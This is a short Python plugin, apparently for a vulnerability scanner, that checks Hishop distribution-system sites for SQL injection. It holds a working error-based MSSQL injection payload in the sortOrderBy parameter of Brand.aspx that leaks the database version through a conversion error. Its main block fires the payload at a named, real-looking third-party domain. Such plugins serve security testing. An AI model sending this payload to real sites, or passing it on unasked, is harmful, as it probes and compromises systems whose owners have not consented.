#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Hishop易分销系统SQL注入漏洞
import re

def assign(service, arg):
    if service == "hishop":
        return True, arg

def audit(arg):
    payload = 'Brand.aspx?pageIndex=1&sortOrderBy=VistiCounts%20Desc)%20AS%20RowNumber%20FROM%20vw_Hishop_BrowseProductList%20p%20WHERE%20SaleStatus%20=%201)%20T%20WHERE%201=1%20and%201=\
convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20--'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target)
    
    if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hishop', 'http://spt.0351tao.cn/')[1])